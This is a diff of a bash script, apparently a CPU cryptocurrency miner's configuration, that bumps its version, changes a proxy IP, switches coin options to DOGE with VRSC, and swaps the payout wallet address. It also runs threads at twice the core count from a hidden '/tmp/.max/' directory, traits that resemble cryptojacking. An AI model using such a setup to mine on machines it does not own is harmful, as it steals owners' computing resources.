@@ -1,7 +1,7 @@
 #!/bin/bash
 echo 
 echo -e '####################################################################################'
-echo -e '############################# CPU2 Ver:0.9.51 ######################################'
+echo -e '############################# CPU2 Ver:0.9.52 ######################################'
 echo -e '####################################################################################'
 echo 
 echo 
@@ -15,22 +15,24 @@ XMPort=21
 DisplayRefrech=120
 
 HZ_PROX1=49.12.115.117
-HZ_PROX2=116.203.206.127
+HZ_PROX2=188.34.159.9
 EU_PROX=49.12.115.117
 US_PROX=173.199.123.152
 CA_PROX=173.199.123.152
 ASIA_PROX=49.12.115.117
 
 #VCOptions="d=16,xn=1,hybrid"
-VCOptions="mc=VRSC"
-#VCOptions="c=VRSC,mc=VRSC,m=solo"
+#VCOptions="mc=VRSC"
+VCOptions="c=DOGE,mc=VRSC"
+#VCOptions="c=VRSC,mc=VRSC"
+
 #VCOptions="X"
 
 SWITCHOPG=AUTO
 SWITCHOP=VC
 
-SWITCHPROX=AUTO
-#SWITCHPROX=$HZ_PROX1
+#SWITCHPROX=AUTO
+SWITCHPROX=$HZ_PROX1
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -43,8 +45,8 @@ W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
 W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
 #W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
-W_VC="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
-#W_VC="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
+#W_VC="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
+W_VC="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 
 # Directory
 Work_Dir="/tmp/.max/"
